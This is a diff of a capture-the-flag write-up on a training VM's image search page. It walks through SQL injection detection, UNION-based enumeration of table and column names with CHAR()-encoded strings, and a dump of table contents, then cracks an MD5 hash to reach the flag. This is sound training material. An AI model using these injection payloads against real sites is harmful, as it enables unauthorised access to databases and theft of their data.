@@ -1,25 +1,22 @@
 
 
-in page : http://machineURL/?page=member 
+in page : http://machineURL/?page=searchimg
 
-you will find an input field to search for a member by ID
+you will find an input field search to IMAGE NUMBER:
 
-you can retrieve the member details by intering a number in the input field
+you can retrieve the image details by intering a number in the input field
 
 one of the ways to detect SQL injection is to submit a quote
 ```
  ' 
 ``` 
-submiting this quote will return this error 
+submiting this quote will return nothing because this input doesn't return the database error, so next we can try OR statement
+
+you can try inputs like 
 ```
-You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'' at line 1 
+1 OR 1=1 to retrive the whole list of images
 ```
-with that output you can be cofident that this is a vulnerable payload
-you can also try inputs like 
-```
-OR 1=1 to retrive the whole list of membert
-notice using this or we get a user named flag with surname GetThe
-```
+and that indeed returns all the images which means that we did find a SQL injection
 
 next, we want to retrieve all the tables, we can do that using this query :
 
@@ -40,31 +37,31 @@ ORDER BY 3--
 etc.
 ```
 
-getting the output of all the talbles, notice a users table, thats our baby
+getting the output of all the talbles, notice a list_images table, thats our baby
 
-we send another query to the database to get all the column names for the users table
+we send another query to the database to get all the column names for the list_images table
 
 ```
-1 union SELECT null , COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = CHAR(0x75, 0x73, 0x65, 0x72, 0x73)
+1 union SELECT null , COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = CHAR(0x6C, 0x69, 0x73, 0x74, 0x5F, 0x69, 0x6D, 0x61, 0x67, 0x65, 0x73)
 ```
 
-notice that we have encoded the users as CHAR(0x75, 0x73, 0x65, 0x72, 0x73)
+notice that we have Represented the list_images as CHAR(0x6C, 0x69, 0x73, 0x74, 0x5F, 0x69, 0x6D, 0x61, 0x67, 0x65, 0x73)
 
-that is because whenever we use some kind of quoted input we get a database error, that is propably due the the website implementing some security michanism
+that is because whenever we use some kind of quoted input we don't get any output
 
-with that we get all the users coulmn names so we can construct a query to get all the data all the users
+with that we get all the list_images coulmn names so we can construct a query to get the data of all the list_images
 
 and we do that using this command : 
 ```
-1 union select null, concat_ws(CHAR(124),user_id, first_name, town, country, planet, Commentaire, countersign) from users
+1 union select null, concat_ws(CHAR(124),id, url, title, comment) from list_images
 ```
-that gives us all the column values in the second column (surname) separated by | (char(124))
+that gives us all the column values in the first column (Title) separated by | (char(124))
 
 ```
-5|Flag|42|42|42|Decrypt this password -> then lower all the char. Sh256 on it and it's good !|5ff9d0165b4f92b14994e5c685cdce28
+5|borntosec.ddns.net/images.png|Hack me ?|If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
 ```
 
-you decrypt 5ff9d0165b4f92b14994e5c685cdce28 and you get FortyTwo
+you decrypt 1928e8083cf461a51303633093573c46 and you get albatroz
 lowering all the letters and sh256 on it and we get the flag
 
 
